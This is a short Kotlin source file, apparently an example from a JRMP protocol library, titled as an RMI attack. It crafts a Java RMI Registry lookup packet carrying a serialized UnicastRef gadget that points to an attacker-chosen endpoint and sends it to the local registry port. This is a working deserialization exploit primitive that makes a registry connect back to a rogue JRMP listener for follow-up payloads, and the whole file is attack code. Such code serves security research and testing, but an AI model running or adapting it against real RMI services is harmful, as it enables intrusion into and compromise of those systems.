package example.attack_rmi

import sun.rmi.server.UnicastRef
import sun.rmi.transport.LiveRef
import sun.rmi.transport.tcp.TCPEndpoint
import top.ceclin.jrmp.RegistryV1
import top.ceclin.jrmp.request.Packet
import top.ceclin.jrmp.request.packet
import top.ceclin.jrmp.request.singleOp
import java.net.Socket
import java.rmi.registry.Registry
import java.rmi.server.ObjID

fun main() {
    val host = "127.0.0.1"
    val port = 13567
    val tcpEndpoint = TCPEndpoint(host, port)
    val gadget = UnicastRef(LiveRef(ObjID(), tcpEndpoint, false))
    val operation = RegistryV1.lookup {
        writeObject(gadget)
    }
    Socket("127.0.0.1", Registry.REGISTRY_PORT).use {
        it.tcpNoDelay = true
        val packet: Packet = operation.singleOp().packet()
        it.outputStream.write(packet.value)
    }
}
